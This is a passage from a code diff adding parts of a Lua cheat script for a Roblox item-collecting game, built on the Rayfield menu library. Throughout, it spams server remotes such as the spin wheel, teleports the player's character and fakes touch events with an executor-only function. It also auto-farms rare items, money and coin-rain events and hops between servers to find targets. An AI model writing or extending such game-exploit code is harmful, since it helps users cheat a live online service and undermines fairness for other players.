+                auto.luckyEnabled = false
+                return
+            end
+            for _, block in ipairs(lb:GetChildren()) do
+                task.spawn(tryFireBlock, block)
+            end
+            if auto.luckyConn then auto.luckyConn:Disconnect() end
+            auto.luckyConn = lb.ChildAdded:Connect(function(block)
+                if auto.luckyEnabled then
+                    task.wait(0.5)
+                    task.spawn(tryFireBlock, block)
+                end
+            end)
+            task.spawn(function()
+                while auto.luckyEnabled do
+                    task.wait(2)
+                    pcall(function()
+                        for _, block in ipairs(lb:GetChildren()) do
+                            if not auto.luckyEnabled then break end
+                            local pp = block:FindFirstChildWhichIsA("ProximityPrompt", true)
+                            if pp and isValidPos(pp.Parent.Position) and shouldFireLucky(block.Name) then
+                                task.spawn(tryFireBlock, block)
+                            end
+                        end
+                    end)
+                end
+            end)
+        else
+            if auto.luckyConn then auto.luckyConn:Disconnect() auto.luckyConn = nil end
+        end
+    end,
+})
+CollectorTab:CreateSection("Auto Spin Wheel")
+CollectorTab:CreateToggle({
+    Name         = "Auto Spin Wheel",
+    CurrentValue = false,
+    Flag         = "AutoSpinWheel",
+    Callback     = function(Value)
+        auto.spinEnabled = Value
+        if Value then
+            auto.spinThread = task.spawn(function()
+                local _spinRemote = nil
+                pcall(function()
+                    _spinRemote = ReplicatedStorage
+                        :WaitForChild("Remotes", 5)
+                        :WaitForChild("SpinWheel", 5)
+                        :WaitForChild("RequestSpin", 5)
+                end)
+                local _spinRefresh = 0
+            while auto.spinEnabled do
+                    if tick() - _spinRefresh > 60 then
+                        pcall(function()
+                            _spinRemote = ReplicatedStorage
+                                :WaitForChild("Remotes", 3)
+                                :WaitForChild("SpinWheel", 3)
+                                :WaitForChild("RequestSpin", 3)
+                        end)
+                        _spinRefresh = tick()
+                    end
+                    if _spinRemote and _spinRemote.Parent then
+                        pcall(function() _spinRemote:FireServer() end)
+                    end
+                    task.wait(0.76)
+                end
+            end)
+        else
+            if auto.spinThread then pcall(task.cancel, auto.spinThread) auto.spinThread = nil end
+        end
+    end,
+})
+CollectorTab:CreateSection("Filters")
+CollectorTab:CreateDropdown({
+    Name            = "Select Rarities",
+    Options         = {"Common","Rare","Epic","Legendary","Mythic","Secret","Celestial","Godly","Forbidden"},
+    CurrentOption   = {},
+    MultipleOptions = true,
+    Flag            = "RarityDropdown",
+    Callback        = function(Options) S.selectedRarities = Options end,
+})
+CollectorTab:CreateDropdown({
+    Name            = "Select Mutations  (empty = all)",
+    Options         = {"Gold","Emerald","Diamond","Bloodmoon","Rainbow","Aqua"},
+    CurrentOption   = {},
+    MultipleOptions = true,
+    Flag            = "MutationDropdown",
+    Callback        = function(Options) S.selectedMutations = Options end,
+})
+CollectorTab:CreateDropdown({
+    Name            = "Select Traits  (empty = all)",
+    Options         = ALL_TRAITS,
+    CurrentOption   = {},
+    MultipleOptions = true,
+    Flag            = "TraitDropdown",
+    Callback        = function(Options) S.selectedTraits = Options end,
+})
+CollectorTab:CreateSection("Carry Settings")
+CollectorTab:CreateSlider({
+    Name         = "Max Carry",
+    Range        = {1, 6},
+    Increment    = 1,
+    Suffix       = "Brainrots",
+    CurrentValue = 1,
+    Flag         = "MaxCarrySlider",
+    Callback     = function(Value)
+        S.maxCarry = Value
+    end,
+})
+CollectorTab:CreateSection("Auto Collector")
+CollectorTab:CreateToggle({
+    Name         = "Start Auto Farm",
+    CurrentValue = false,
+    Flag         = "AutoFarmToggle",
+    Callback     = function(Value)
+        if Value then
+            task.spawn(function()
+                task.wait(0.3)
+                if not (Rayfield.Flags["AutoFarmToggle"] and Rayfield.Flags["AutoFarmToggle"].CurrentValue) then return end
+                if #S.selectedRarities == 0 then
+                    local flagRarities = Rayfield.Flags["RarityDropdown"] and Rayfield.Flags["RarityDropdown"].CurrentOption
+                    if type(flagRarities) == "table" and #flagRarities > 0 then
+                        S.selectedRarities = flagRarities
+                    end
+                end
+                if #S.selectedRarities == 0 then
+                    Rayfield:Notify({ Title = "Auto Farm", Content = "Select at least one Rarity first!", Duration = 4, Image = 4483362458 })
+                    pcall(function() if Rayfield.Flags["AutoFarmToggle"] then Rayfield.Flags["AutoFarmToggle"]:Set(false) end end)
+                    return
+                end
+                hideLava()
+                local plot = getPlayerPlot()
+                if plot then attachPlotCounter(plot) end
+                startFarm(S.selectedRarities)
+            end)
+        else
+            stopFarmLoop()
+        end
+    end,
+})
+CollectorTab:CreateSection("Farm by Name")
+CollectorTab:CreateInput({
+    Name                    = "Brainrot Name",
+    PlaceholderText         = "e.g. BrrBrr",
+    RemoveTextAfterFocusLost = false,
+    Flag                    = "FarmByNameInput",
+    Callback                = function(Value) S.farmByNameFilter = Value or "" end,
+})
+CollectorTab:CreateButton({
+    Name     = "Farm Selected Brainrot  (one pass)",
+    Callback = function()
+        if S.farmByNameFilter == "" then
+            Rayfield:Notify({ Title = "Farm by Name", Content = "Type a Brainrot name first!", Duration = 4, Image = 4483362458 })
+            return
+        end
+        pcall(scanWorld)
+        local found = false
+        for _, entry in ipairs(monitorData.brainrots) do
+            if entry.obj and entry.obj.Parent and passesByNameFilter(entry.obj) then
+                found = true
+                Rayfield:Notify({ Title = "Found!", Content = entry.name .. " (" .. entry.rarity .. ") — collecting...", Duration = 3, Image = 4483362458 })
+                local e = entry
+                task.spawn(function() pcall(function() collectOne(e.rarity, e.obj) end) end)
+                break
+            end
+        end
+        if not found then
+            Rayfield:Notify({ Title = "Not Spawned", Content = "\"" .. S.farmByNameFilter .. "\" not found in world.", Duration = 4, Image = 4483362458 })
+        end
+    end,
+})
+CollectorTab:CreateToggle({
+    Name         = "Auto Farm Selected Brainrot  (monitor)",
+    CurrentValue = false,
+    Flag         = "AutoFarmNameToggle",
+    Callback     = function(Value)
+        S.autoNameEnabled = Value
+        if Value then
+            hideLava()
+            if S.farmByNameFilter == "" then
+                Rayfield:Notify({ Title = "Auto Farm by Name", Content = "Type a Brainrot name first!", Duration = 4, Image = 4483362458 })
+                S.autoNameEnabled = false
+                pcall(function() if Rayfield.Flags["AutoFarmNameToggle"] then Rayfield.Flags["AutoFarmNameToggle"]:Set(false) end end)
+                return
+            end
+            S.autoNameThread = task.spawn(function()
+                while S.autoNameEnabled do
+                    if S.grabLock then task.wait(0.2) continue end
+                    local snapshot = monitorData.brainrots
+                    local collected = false
+                    for _, entry in ipairs(snapshot) do
+                        if not S.autoNameEnabled then break end
+                        if S.grabLock then break end
+                        if entry.obj and entry.obj.Parent and passesByNameFilter(entry.obj) then
+                            collected = true
+                            local e = entry
+                            pcall(function() collectOne(e.rarity, e.obj) end)
+                            task.wait(0.5)
+                            break
+                        end
+                    end
+                    if not collected then task.wait(1) end
+                end
+            end)
+        else
+            if S.autoNameThread then pcall(task.cancel, S.autoNameThread) S.autoNameThread = nil end
+        end
+    end,
+})
+CollectorTab:CreateSection("Auto Money")
+CollectorTab:CreateToggle({
+    Name         = "Auto Collect Money",
+    CurrentValue = false,
+    Flag         = "AutoMoney",
+    Callback     = function(Value)
+        auto.moneyEnabled = Value
+        if Value then
+            auto.moneyThread = task.spawn(function()
+                while auto.moneyEnabled do
+                    pcall(function()
+                        local gf = workspace:FindFirstChild("GameFolder")
+                        local plots = gf and gf:FindFirstChild("Plots")
+                        if not plots then return end
+                        for _, plot in pairs(plots:GetChildren()) do
+                            local brainrots = plot:FindFirstChild("Brainrots")
+                            if not brainrots then continue end
+                            for _, br in pairs(brainrots:GetChildren()) do
+                                local ok, owner = pcall(function() return br:GetAttribute("Owner") end)
+                                if ok and owner and tostring(owner) == tostring(player.UserId) then
+                                    local places = plot:FindFirstChild("Places")
+                                    if places then
+                                        for _, place in pairs(places:GetChildren()) do
+                                            local claim = place:FindFirstChild("Claim")
+                                            if claim and claim:IsA("BasePart") then
+                                                local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                                                if root then
+                                                    _firetouchinterest(root, claim, 0)
+                                                    task.wait(0.05)
+                                                    _firetouchinterest(root, claim, 1)
+                                                    task.wait(0.1)
+                                                end
+                                            end
+                                        end
+                                    end
+                                    break
+                                end
+                            end
+                        end
+                    end)
+                    task.wait(3)
+                end
+            end)
+        else
+            if auto.moneyThread then pcall(task.cancel, auto.moneyThread) auto.moneyThread = nil end
+        end
+    end,
+})
+CollectorTab:CreateSection("Auto Coin")
+local coinEventActive   = false
+local coinCollectThread = nil
+local _liveCoinParts  = {}
+local _coinAddedConns = {}
+
+local function startCoinTracker()
+    for _, c in pairs(_coinAddedConns) do pcall(function() c:Disconnect() end) end
+    _coinAddedConns = {}
+    _liveCoinParts  = {}
+    local CS = game:GetService("CollectionService")
+    local function registerCoin(obj)
+        if not obj or not obj.Parent then return end
+        local part = obj:FindFirstChild("Part")
+                  or obj.PrimaryPart
+                  or obj:FindFirstChildWhichIsA("BasePart")
+        if not part then
+            task.defer(function()
+                if not obj.Parent then return end
+                local p = obj:FindFirstChild("Part")
+                       or obj.PrimaryPart
+                       or obj:FindFirstChildWhichIsA("BasePart")
+                if p then
+                    _liveCoinParts[p] = obj
+                    obj.AncestryChanged:Connect(function()
+                        if not obj.Parent then _liveCoinParts[p] = nil end
+                    end)
+                end
+            end)
+            return
+        end
+        _liveCoinParts[part] = obj
+        obj.AncestryChanged:Connect(function()
+            if not obj.Parent then _liveCoinParts[part] = nil end
+        end)
+    end
+    for _, obj in ipairs(CS:GetTagged("COLLECTABLE_COIN")) do
+        registerCoin(obj)
+    end
+    local c1 = CS:GetInstanceAddedSignal("COLLECTABLE_COIN"):Connect(function(obj)
+        registerCoin(obj)
+    end)
+    local c2 = CS:GetInstanceRemovedSignal("COLLECTABLE_COIN"):Connect(function(obj)
+        for part, coinObj in pairs(_liveCoinParts) do
+            if coinObj == obj then _liveCoinParts[part] = nil break end
+        end
+    end)
+    table.insert(_coinAddedConns, c1)
+    table.insert(_coinAddedConns, c2)
+end
+local function stopCoinTracker()
+    for _, c in pairs(_coinAddedConns) do pcall(function() c:Disconnect() end) end
+    _coinAddedConns = {}
+    _liveCoinParts  = {}
+    if coinCollectThread then pcall(task.cancel, coinCollectThread) coinCollectThread = nil end
+    coinEventActive = false
+end
+local function findCoins()
+    local coins = {}
+    for part, obj in pairs(_liveCoinParts) do
+        if part and part.Parent then
+            table.insert(coins, { part = part, obj = obj })
+        else
+            _liveCoinParts[part] = nil
+        end
+    end
+    if #coins == 0 then
+        local _charSet = {}
+        pcall(function()
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr.Character then _charSet[plr.Character] = true end
+            end
+        end)
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            if not obj or not obj.Parent then continue end
+            local n = obj.Name:lower()
+            if not n:find("coin") then continue end
+            if not (obj:IsA("BasePart") or obj:IsA("Model")) then continue end
+            local skip = false
+            local anc = obj.Parent
+            while anc and anc ~= workspace do
+                if _charSet[anc] then skip = true break end
+                anc = anc.Parent
+            end
+            if not skip then
+                local part = (obj:IsA("BasePart") and obj)
+                    or obj.PrimaryPart
+                    or obj:FindFirstChildWhichIsA("BasePart")
+                if part then
+                    _liveCoinParts[part] = obj
+                    obj.AncestryChanged:Connect(function()
+                        if not obj.Parent then _liveCoinParts[part] = nil end
+                    end)
+                    table.insert(coins, { part = part, obj = obj })
+                end
+            end
+        end
+    end
+    return coins
+end
+local _coinHopDone    = false
+local _coinHopPending = false
+local function _collectCoinObj(coinEntry)
+    local obj  = coinEntry.obj
+    local part = coinEntry.part
+    if not obj or not obj.Parent then return end
+    if not part or not part.Parent then return end
+    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local pos = part.Position
+    pcall(function() root.CFrame = CFrame.new(pos.X, pos.Y + 1, pos.Z) end)
+    task.wait(0.1)
+    if part.Parent then
+        _firetouchinterest(root, part, 0)
+        task.wait(0.05)
+        _firetouchinterest(root, part, 1)
+    end
+    task.wait(0.2)
+end
+local function startCoinCollect()
+    if coinCollectThread then pcall(task.cancel, coinCollectThread) coinCollectThread = nil end
+    _coinHopDone    = false
+    coinEventActive = true
+    coinCollectThread = task.spawn(function()
+        local deadline     = tick() + S.coinEventDuration
+        local absoluteEnd  = tick() + math.max(S.coinEventDuration, 60) + 60
+        local idleTicks    = 0
+        local hopActive    = S.autoHopCoinEnabled
+        while S.autoCoinEnabled and (not hopActive or not getgenv().OxyoHopStopped) do
+            local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if not root then task.wait(0.3) continue end
+            local coins = findCoins()
+            if tick() > absoluteEnd then break end
+            if #coins == 0 then
+                if not workspace:GetAttribute("CoinRain") then
+                    idleTicks = idleTicks + 1
+                    if tick() > deadline and idleTicks > 4 then break end
+                else
+                    idleTicks = idleTicks + 1
+                    deadline = math.max(deadline, tick() + 10)
+                    if idleTicks > 20 then break end
+                end
+                task.wait(0.5)
+                continue
+            end
+            idleTicks = 0
+            deadline  = math.max(deadline, tick() + 10)
+            table.sort(coins, function(a, b)
+                local ra = root and (a.part.Position - root.Position).Magnitude or 0
+                local rb = root and (b.part.Position - root.Position).Magnitude or 0
+                return ra < rb
+            end)
+            for _, coinEntry in ipairs(coins) do
+                if not S.autoCoinEnabled then break end
+                if hopActive and getgenv().OxyoHopStopped then break end
+                _collectCoinObj(coinEntry)
+            end
+        end
+        coinEventActive   = false
+        coinCollectThread = nil
+        pcall(function()
+            local hum  = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+            local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if hum and root then
+                hum.PlatformStand = false
+                hum:ChangeState(Enum.HumanoidStateType.Running)
+            end
+        end)
+        if S.autoHopCoinEnabled and S.autoCoinEnabled and not _coinHopDone and not getgenv().OxyoHopStopped then
+            _coinHopDone    = true
+            _coinHopPending = true
+            Rayfield:Notify({ Title = "Auto Hop", Content = "Coin Rain ended — hopping...", Duration = 2, Image = 4483362458 })
+            task.wait(1)
+            if not getgenv().OxyoHopStopped and S.autoHopCoinEnabled then
+                getgenv().OxyoAutoHopCoin = true
+                getgenv().OxyoHopStopped  = false
+                task.spawn(function()
+                    task.wait(0.1)
+                    ServerHop()
+                end)
+            end
+        end
+    end)
+end
+local _notifConnected = {}
+local function _tryConnectNotif(remote)
+    if _notifConnected[remote] then return end
+    _notifConnected[remote] = true
+    remote.OnClientEvent:Connect(function(msg)
+        if type(msg) ~= "string" and type(msg) ~= "table" then return end
+        local lower = type(msg) == "string" and msg:lower() or ""
+        local hasCoinRain = lower:find("coin") and (lower:find("rain") or lower:find("start") or lower:find("event"))
+        if not hasCoinRain then
+            hasCoinRain = workspace:GetAttribute("CoinRain") == true
+        end
+        if hasCoinRain then
+            local secs = type(msg) == "string" and msg:match("(%d+)") or nil
+            S.coinEventDuration = tonumber(secs) or 60
+            if S.autoCoinEnabled and not coinEventActive then
+                task.wait(0.5)
+                startCoinTracker()
+                Rayfield:Notify({ Title = "🪙 Coin Rain!", Content = "Started — farming!", Duration = 3, Image = 4483362458 })
+                sendWebhook("🪙 Coin Rain Started!", "Event started!", 16766720)
+                startCoinCollect()
+            end
+        end
+    end)
+end
+task.spawn(function()
+    local _notifPaths = {
+        {"Events","Notification"},{"Remotes","Notification"},
+        {"Events","CoinRain"},{"Remotes","CoinRain"},
+        {"Events","SystemNotification"},{"Remotes","SystemNotification"},
+    }
+    for _, path in ipairs(_notifPaths) do
+        pcall(function()
+            local parent = ReplicatedStorage
+            for i = 1, #path - 1 do
+                local c = parent:FindFirstChild(path[i]) or parent:WaitForChild(path[i], 3)
+                if not c then return end
+                parent = c
+            end
+            local remote = parent:FindFirstChild(path[#path])
+            if remote and remote:IsA("RemoteEvent") then _tryConnectNotif(remote) end
+        end)
+    end
+end)
+task.spawn(function()
+    task.wait(3.5)
+    while true do
+        task.wait(3)
+        if S.autoCoinEnabled and not _coinHopPending then
+            local isActive = workspace:GetAttribute("CoinRain") == true
+            local coins    = findCoins()
+            if (isActive or #coins >= 1) and not coinEventActive then
+                S.coinEventDuration = isActive and 60 or 90
+                Rayfield:Notify({ Title = "🪙 Coin Rain!", Content = "Detected " .. #coins .. " coins — farming!", Duration = 3, Image = 4483362458 })
+                sendWebhook("🪙 Coin Rain!", "Detected **" .. #coins .. "** coins in server!", 16766720)
+                startCoinCollect()
+            elseif coinEventActive and not coinCollectThread and not _coinHopPending then
+                startCoinCollect()
+            end
+        end
+    end
+end)
+task.spawn(function()
+    workspace:GetAttributeChangedSignal("CoinRain"):Connect(function()
+        if workspace:GetAttribute("CoinRain") == true then
+            if S.autoCoinEnabled and not coinEventActive then
+                S.coinEventDuration = 60
+                startCoinTracker()
+                task.wait(0.5)
+                local coins = findCoins()
+                Rayfield:Notify({ Title = "🪙 Coin Rain!", Content = "Event started — farming " .. #coins .. " coins!", Duration = 3, Image = 4483362458 })
+                sendWebhook("🪙 Coin Rain Started!", "Event started!", 16766720)
+                startCoinCollect()
+            end
+        else
+            if coinEventActive and S.autoCoinEnabled then
+                Rayfield:Notify({ Title = "🪙 Coin Rain", Content = "Event ended.", Duration = 2, Image = 4483362458 })
+            end
+        end
+    end)
+end)
+CollectorTab:CreateToggle({
+    Name         = "Auto Collect Coins",
+    CurrentValue = false,
+    Flag         = "AutoCoin",
+    Callback     = function(Value)
+        S.autoCoinEnabled = Value
+        if Value then
+            hideLava()
+            startCoinTracker()
+            task.wait(0.5)
+            local isActive = workspace:GetAttribute("CoinRain") == true
+            local coins    = findCoins()
+            if isActive or #coins >= 1 then
+                S.coinEventDuration = isActive and 60 or 90
+                Rayfield:Notify({ Title = "🪙 Coin Rain!", Content = "Active — farming " .. #coins .. " coins!", Duration = 3, Image = 4483362458 })
+                startCoinCollect()
+            else
+                Rayfield:Notify({ Title = "🪙 Auto Coin", Content = "Ready — waiting for Coin Rain...", Duration = 3, Image = 4483362458 })
+            end
+        else
+            if coinCollectThread then pcall(task.cancel, coinCollectThread) coinCollectThread = nil end
+            coinEventActive = false
+            stopCoinTracker()
+        end
+    end,
+})
+HopTab:CreateSection("Auto Hop Coin Event")
+HopTab:CreateParagraph({
+    Title   = "Auto Hop — How it works",
+    Content = "Each mode hops servers automatically looking for the selected target.\n🪙 Coin: finds active Coin Rain → farms all coins → hops again.\n👑 Godly / 🌌 Celestial / 🔷 Frag: finds & collects brainrots → hops if none found.\n🌊 Aqua: finds active Aqua Event → auto-fishes → hops when done.\n\nStop: press RightShift (PC) or tap ⛔ button.",
+})
+local hopToggleRef = HopTab:CreateToggle({
+    Name         = "Auto Hop + Farm Coins",
+    CurrentValue = false,
+    Flag         = "AutoHopCoin",
+    Callback     = function(Value)
+        if not Value then
+            getgenv().OxyoAutoHopCoin = false
+            getgenv().OxyoHopStopped  = true
+            S.autoHopCoinEnabled = false
+            S.autoCoinEnabled    = false
+            if coinCollectThread then
+                pcall(task.cancel, coinCollectThread)
+                coinCollectThread = nil
+            end
+            pcall(function()
+                local g = game:GetService("CoreGui"):FindFirstChild("OxyoStopHopGui")
+                if g then g:Destroy() end
+            end)
+            Rayfield:Notify({ Title = "⛔ Auto Hop", Content = "Stopped.", Duration = 3, Image = 4483362458 })
+            return
+        end
+        if getgenv().OxyoAutoHopGodly or getgenv().OxyoAutoHopCel or getgenv().OxyoAutoHopFrag then
+        end
+        getgenv().OxyoHopStopped      = false
+        getgenv().OxyoHopGodlyStopped = false
+        getgenv().OxyoHopCelStopped   = false
+        getgenv().OxyoHopFragStopped  = false
+        getgenv().OxyoAutoHopCoin = true
+        S.autoHopCoinEnabled = true
+        S.autoCoinEnabled    = true
+        hideLava()
+        startCoinTracker()
+        showStopHopGui()
+        task.spawn(function()
+            Rayfield:Notify({ Title = "Auto Hop", Content = "Checking this server...", Duration = 2, Image = 4483362458 })
+            local status, timeLeft = waitForCoinRainStatus(10)
+            if not getgenv().OxyoAutoHopCoin or getgenv().OxyoHopStopped then return end
+
+            if not status then
+                task.wait(1)
+                status, timeLeft = getCoinRainStatus()
+                if not status then
+                    local s2, t2 = _detectCoinRainFallback()
+                    if s2 then status, timeLeft = s2, t2 end
+                end
+            end
+            if status == "active" and (timeLeft or 0) >= 10 then
+                Rayfield:Notify({ Title = "Coin Rain!", Content = "Active! Farming now...", Duration = 3, Image = 4483362458 })
+                coinEventActive   = true
+                S.coinEventDuration = timeLeft or 60
+                startCoinCollect()
+            else
+
+                if status == "active" then
+                    Rayfield:Notify({ Title = "🪙 Coin Rain", Content = "بدأ مع وقت قصير — ننتظر...", Duration = 3, Image = 4483362458 })
+                    task.wait(5)
+                    local s3, t3 = getCoinRainStatus()
+                    if s3 == "active" and (t3 or 0) >= 10 then
+                        if not getgenv().OxyoAutoHopCoin or getgenv().OxyoHopStopped then return end
+                        coinEventActive = true
+                        S.coinEventDuration = t3 or 60
+                        startCoinCollect()
+                        return
+                    end
+                end
+                local queuedSecs = _getCoinRainQueuedTime()
+                if queuedSecs and queuedSecs > 0 and queuedSecs <= 1200 then
+                    local mins = math.floor(queuedSecs / 60)
+                    local secs = queuedSecs % 60
+                    Rayfield:Notify({
+                        Title   = "🪙 Coin Rain Incoming!",
+                        Content = string.format("Queued in %dm %ds — waiting on this server!", mins, secs),
+                        Duration = 6, Image = 4483362458,
+                    })
+                    local waited2 = 0
+                    while waited2 < queuedSecs + 15
+                        and getgenv().OxyoAutoHopCoin
+                        and not getgenv().OxyoHopStopped
+                    do
+                        task.wait(2)
+                        waited2 = waited2 + 2
+                        local s2, t2 = getCoinRainStatus()
+                        if s2 == "active" and (t2 or 0) >= 8 then
+                            Rayfield:Notify({ Title = "🪙 Coin Rain!", Content = "Started! Farming now...", Duration = 3, Image = 4483362458 })
+                            coinEventActive     = true
+                            S.coinEventDuration = t2 or 60
+                            startCoinCollect()
+                            return
+                        end
+                    end
+                    if getgenv().OxyoAutoHopCoin and not getgenv().OxyoHopStopped then
+                        task.spawn(smartHop)
+                    end
+                else
+                    Rayfield:Notify({ Title = "Auto Hop", Content = "No Coin Rain — hopping...", Duration = 2, Image = 4483362458 })
+                    task.wait(math.random(5, 10))
+                    if not getgenv().OxyoAutoHopCoin then return end
+                    task.spawn(smartHop)
+                end
+            end
+        end)
+    end,
+})
+local function setHopToggleOff()
+    pcall(function()
+        if Rayfield and Rayfield.Flags then
+            if Rayfield.Flags["AutoHopCoin"]      then Rayfield.Flags["AutoHopCoin"]:Set(false)      end
+        end
+    end)
+
+    pcall(function()
+        if hopToggleRef and hopToggleRef.Set then hopToggleRef:Set(false) end
+    end)
+end
+local hopGodlyToggleRef
+local hopCelToggleRef
+local hopFragToggleRef
+nuclearStop = function()
+    getgenv().OxyoAutoHopCoin     = false
+    getgenv().OxyoHopStopped      = true
+    getgenv().OxyoAutoHopGodly    = false
+    getgenv().OxyoHopGodlyStopped = true
+    getgenv().OxyoAutoHopCel      = false
+    getgenv().OxyoHopCelStopped   = true
+    getgenv().OxyoAutoHopFrag     = false
+    getgenv().OxyoHopFragStopped  = true
+    getgenv().OxyoAutoHopAqua     = false
+    getgenv().OxyoHopAquaStopped  = true
+    getgenv().OxyoExecQueued      = false
+    S.autoHopCoinEnabled  = false
+    S.autoCoinEnabled     = false
+    S.autoHopGodlyEnabled = false
+    S.autoHopCelEnabled   = false
+    S.autoHopFragEnabled  = false
+    S.autoHopAquaEnabled  = false
+    if coinCollectThread then
+        pcall(task.cancel, coinCollectThread)
+        coinCollectThread = nil
+    end
+    stopCoinTracker()
+    if S.autoHopGodlyThread then
+        pcall(task.cancel, S.autoHopGodlyThread)
+        S.autoHopGodlyThread = nil
+    end
+    if S.autoHopCelThread then
+        pcall(task.cancel, S.autoHopCelThread)
+        S.autoHopCelThread = nil
+    end
+    if S.autoHopFragThread then
+        pcall(task.cancel, S.autoHopFragThread)
+        S.autoHopFragThread = nil
+    end
+    if S.autoHopAquaThread then
+        pcall(task.cancel, S.autoHopAquaThread)
+        S.autoHopAquaThread = nil
+    end
+    pcall(function() if getgenv()._OxyoStopAquaLoop then getgenv()._OxyoStopAquaLoop() end end)
+    setHopToggleOff()
+    pcall(function()
+        if Rayfield and Rayfield.Flags then
+            if Rayfield.Flags["AutoHopGodly"]    then Rayfield.Flags["AutoHopGodly"]:Set(false)    end
+            if Rayfield.Flags["AutoHopCelestial"] then Rayfield.Flags["AutoHopCelestial"]:Set(false) end
+            if Rayfield.Flags["AutoHopFrag"]     then Rayfield.Flags["AutoHopFrag"]:Set(false)     end
+            if Rayfield.Flags["AutoHopAqua"]     then Rayfield.Flags["AutoHopAqua"]:Set(false)     end
+        end
+    end)
+
+    pcall(function()
+        if hopGodlyToggleRef and hopGodlyToggleRef.Set then hopGodlyToggleRef:Set(false) end
+    end)
+    pcall(function()
+        if hopCelToggleRef and hopCelToggleRef.Set then hopCelToggleRef:Set(false) end
+    end)
+    pcall(function()
+        if hopFragToggleRef and hopFragToggleRef.Set then hopFragToggleRef:Set(false) end
+    end)
+    pcall(function()
+        if hopAquaToggleRef and hopAquaToggleRef.Set then hopAquaToggleRef:Set(false) end
+    end)
+    pcall(function() if Rayfield then Rayfield:SaveConfiguration() end end)
+    pcall(function()
+        local g = game:GetService("CoreGui"):FindFirstChild("OxyoStopHopGui")
+        if g then g:Destroy() end
+    end)
+    getgenv().OxyoManualHop = false
+    Rayfield:Notify({ Title = "⛔ Auto Hop", Content = "Stopped.", Duration = 3, Image = 4483362458 })
+end
+showStopHopGui = function()
+    pcall(function()
+        local old = game:GetService("CoreGui"):FindFirstChild("OxyoStopHopGui")
+        if old then old:Destroy() end
+    end)
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name           = "OxyoStopHopGui"
+    screenGui.ResetOnSpawn   = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Parent         = game:GetService("CoreGui")
+    local btn = Instance.new("TextButton")
+    btn.Size             = UDim2.new(0, 170, 0, 55)
+    btn.Position         = UDim2.new(0.5, -85, 1, -80)
+    btn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+    btn.TextColor3       = Color3.fromRGB(255, 255, 255)
+    btn.Text             = "⛔ Stop Auto Hop"
+    btn.Font             = Enum.Font.GothamBold
+    btn.TextSize         = 15
+    btn.Parent           = screenGui
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
+    btn.MouseButton1Click:Connect(function()
+        screenGui:Destroy()
+        nuclearStop()
+    end)
+end
+HopTab:CreateButton({
+    Name     = "⛔ Stop Auto Hop",
+    Callback = function() nuclearStop() end,
+})
+HopTab:CreateButton({
+    Name     = "🔄 Reset Hop State",
+    Callback = function()
+        getgenv().OxyoHopStopped      = false
+        getgenv().OxyoHopGodlyStopped = false
+        getgenv().OxyoHopCelStopped   = false
+        getgenv().OxyoHopFragStopped  = false
+        getgenv().OxyoHopAquaStopped  = false
+        getgenv().OxyoExecQueued      = false
+        getgenv().OxyoDeadServers     = {}
+        Rayfield:Notify({ Title = "🔄 Reset", Content = "Hop state + dead server list cleared.", Duration = 3, Image = 4483362458 })
+    end,
+})
+
+HopTab:CreateSection("Auto Hop + Godly")
+hopGodlyToggleRef = HopTab:CreateToggle({
+    Name         = "Auto Hop + Farm Godly",
+    CurrentValue = false,
+    Flag         = "AutoHopGodly",
+    Callback     = function(Value)
+        if not Value then
+            getgenv().OxyoAutoHopGodly    = false
+            getgenv().OxyoHopGodlyStopped = true
+            S.autoHopGodlyEnabled = false
+            if S.autoHopGodlyThread then
+                pcall(task.cancel, S.autoHopGodlyThread)
+                S.autoHopGodlyThread = nil
+            end
+            pcall(function()
+                local g = game:GetService("CoreGui"):FindFirstChild("OxyoStopHopGui")
+                if g then g:Destroy() end
+            end)
+            Rayfield:Notify({ Title = "⛔ Auto Hop Godly", Content = "Stopped.", Duration = 3, Image = 4483362458 })
+            return
+        end
+        if getgenv().OxyoAutoHopCoin or getgenv().OxyoAutoHopCel or getgenv().OxyoAutoHopFrag then
+        end
+        getgenv().OxyoHopStopped      = false
+        getgenv().OxyoHopGodlyStopped = false
+        getgenv().OxyoHopCelStopped   = false
+        getgenv().OxyoHopFragStopped  = false
+        getgenv().OxyoAutoHopGodly    = true
+        S.autoHopGodlyEnabled = true
+        hideLava()
+        showStopHopGui()
+        S.autoHopGodlyThread = task.spawn(function()
+            runRarityHopFarm("Godly", "OxyoAutoHopGodly", "OxyoHopGodlyStopped")
+        end)
+    end,
+})
+HopTab:CreateSection("Auto Hop + Celestial")
+hopCelToggleRef = HopTab:CreateToggle({
+    Name         = "Auto Hop + Farm Celestial",
+    CurrentValue = false,
+    Flag         = "AutoHopCelestial",
+    Callback     = function(Value)
+        if not Value then
+            getgenv().OxyoAutoHopCel    = false
+            getgenv().OxyoHopCelStopped = true
+            S.autoHopCelEnabled = false
+            if S.autoHopCelThread then
+                pcall(task.cancel, S.autoHopCelThread)
+                S.autoHopCelThread = nil
+            end
+            pcall(function()
+                local g = game:GetService("CoreGui"):FindFirstChild("OxyoStopHopGui")
+                if g then g:Destroy() end
+            end)
+            Rayfield:Notify({ Title = "⛔ Auto Hop Celestial", Content = "Stopped.", Duration = 3, Image = 4483362458 })
+            return
+        end
+        if getgenv().OxyoAutoHopCoin or getgenv().OxyoAutoHopGodly or getgenv().OxyoAutoHopFrag then
+        end
+        getgenv().OxyoHopStopped      = false
+        getgenv().OxyoHopGodlyStopped = false
+        getgenv().OxyoHopCelStopped   = false
+        getgenv().OxyoHopFragStopped  = false
+        getgenv().OxyoAutoHopCel    = true
+        S.autoHopCelEnabled = true
+        hideLava()
+        showStopHopGui()
+        S.autoHopCelThread = task.spawn(function()
+            runRarityHopFarm("Celestial", "OxyoAutoHopCel", "OxyoHopCelStopped")
+        end)
+    end,
+})
+HopTab:CreateSection("Auto Hop + Fragments")
+hopFragToggleRef = HopTab:CreateToggle({
+    Name         = "Auto Hop + Farm Fragments",
+    CurrentValue = false,
+    Flag         = "AutoHopFrag",
+    Callback     = function(Value)
+        if not Value then
